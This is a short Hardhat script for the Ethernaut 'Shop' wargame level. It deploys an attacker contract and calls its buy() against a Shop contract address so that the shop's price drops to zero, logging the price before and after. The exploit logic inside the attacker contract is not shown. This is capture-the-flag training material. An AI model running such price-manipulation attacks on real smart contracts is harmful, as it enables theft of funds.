const { ethers } = require("hardhat");
const Runner = require("./lib/runner");
const Deployer = require("./deployer");

Runner.run(async () => { 
    
    //PLACE THE SHOP CONTRACT ADDRESS HERE (Ethernaut: contract.address)
    const contractAddr = "0xFbf3E51E75ea4eFC515D663dFD41183956Aa1f60";
    
    //deploy attack contract 
    const attacker = await Deployer.deploy();
    const shop = await ethers.getContractAt("Shop", contractAddr);
    
    console.log("* * * ");
    console.log(`shop's price is ${await shop.price()}`);
    
    //buy 
    await attacker.buy(contractAddr);
    
    //check shop's new price (should be 0)
    console.log(`shop's new price is ${await shop.price()}`);
    
    console.log("* * * ");
});
